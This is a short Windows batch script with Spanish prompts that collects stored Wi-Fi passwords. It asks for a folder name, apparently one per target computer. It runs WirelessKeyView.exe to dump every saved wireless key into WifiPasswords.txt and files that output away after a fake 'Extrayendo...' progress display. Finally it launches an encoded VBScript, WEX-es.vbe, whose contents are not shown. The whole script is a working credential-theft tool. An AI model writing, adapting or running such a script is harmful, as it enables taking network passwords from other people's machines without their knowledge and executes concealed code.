@echo off
mode 50,6
color a
goto I
:emptyoption
cls
echo.
echo El nombre no puede quedar vacio.
pause>nul
cls
goto I
:I
echo Que nombre le pongo a la carpeta?
set /p namecomputer=
if "%namecomputer%" EQU "" (goto emptyoption)
md %namecomputer%
start WirelessKeyView.exe /stext WifiPasswords.txt
cls
echo Extrayendo.
timeout /t 1 /nobreak > nul
cls
echo Extrayendo..
timeout /t 1 /nobreak > nul
cls
echo Extrayendo...
timeout /t 1 /nobreak > nul
move "WifiPasswords.txt" %namecomputer% 
cls
start WEX-es.vbe
cls
exit